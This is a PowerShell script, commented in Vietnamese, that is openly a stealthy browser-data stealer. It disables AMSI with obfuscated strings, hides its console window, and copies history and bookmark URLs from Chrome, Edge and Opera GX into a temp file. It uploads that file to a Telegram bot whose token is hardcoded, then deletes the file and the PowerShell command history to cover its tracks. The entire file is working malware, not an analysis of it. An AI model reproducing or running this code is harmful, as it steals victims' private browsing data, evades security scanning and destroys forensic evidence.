<# 
=================================================================================================
Kịch bản: Browser Data Exfiltration (Stealth & Obfuscated)
=================================================================================================
#>

param($hide = 'y')

# --- BƯỚC 1: AMSI BYPASS (Làm rối từ khóa nhạy cảm) ---
try {
    $u = [Ref].Assembly.GetType(('System.Management.Automation.' + 'Am' + 'si' + 'Ut' + 'ils'))
    $f = $u.GetField(('am' + 'si' + 'In' + 'it' + 'Fa' + 'il' + 'ed'), 'NonPublic,Static')
    $f.SetValue($null, $true)
} catch { }

# --- BƯỚC 2: CƠ CHẾ ẨN CỬA SỔ ---
if($hide -eq 'y'){
    $w = (Get-Process -PID $pid).MainWindowHandle
    $s = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
    $t = Add-Type -MemberDefinition $s -Name 'W32' -Namespace 'API' -PassThru
    if($w -ne [System.IntPtr]::Zero){ [void]$t::ShowWindowAsync($w, 0) }
}

# --- BƯỚC 3: THIẾT LẬP TELEGRAM ---
$Token = "8734606734:AAEW7nl8oRmtFKZV2SdVgtUAnWtPcH7bThw"
$ChatID = "8312702210"
$TeleURL = "https://api.telegram.org/bot$Token/sendDocument"
$outpath = "$env:TEMP\sys_log_data.txt" # Đổi tên file để tránh từ khóa "history"

"--- BROWSER REPORT | $(Get-Date) ---" | Out-File $outpath -Encoding UTF8

# --- BƯỚC 4: QUÉT DỮ LIỆU (Dùng Regex để bypass việc khóa file SQL) ---
$Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

$Paths = @{
    'CH_H' = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
    'CH_B' = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
    'ED_H' = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
    'ED_B' = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
    'OP_H' = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
    'OP_B' = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
}

foreach ($Key in $Paths.Keys) {
    $Path = $Paths[$Key]
    if (Test-Path $Path) {
        try {
            # Copy file ra Temp để tránh bị lỗi "File in use" khi trình duyệt đang mở
            $tmpCopy = "$env:TEMP\tmp_data"
            Copy-Item $Path $tmpCopy -Force -ErrorAction SilentlyContinue
            
            # Đọc nội dung thô và dùng Regex lọc URL (Không cần sqlite3.exe - Rất nhanh)
            $Content = Get-Content -Path $tmpCopy -Raw -ErrorAction SilentlyContinue
            $Matches = [regex]::Matches($Content, $Regex)
            $Matches.Value | Sort-Object -Unique | ForEach-Object {
                "$Key | $_" | Out-File $outpath -Append -Encoding UTF8
            }
            Remove-Item $tmpCopy -Force
        } catch { continue }
    }
}

# --- BƯỚC 5: GỬI DỮ LIỆU VÀ XÓA DẤU VẾT ---
if (Test-Path $outpath) {
    # Gửi file qua Telegram
    curl.exe -X POST $TeleURL -F "chat_id=$ChatID" -F "document=@$outpath" | Out-Null
    
    Start-Sleep -Seconds 2
    # Xóa file báo cáo
    Remove-Item $outpath -Force
}

# Xóa lịch sử lệnh PowerShell (Anti-Forensics)
Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
Stop-Process -Id $PID -Force
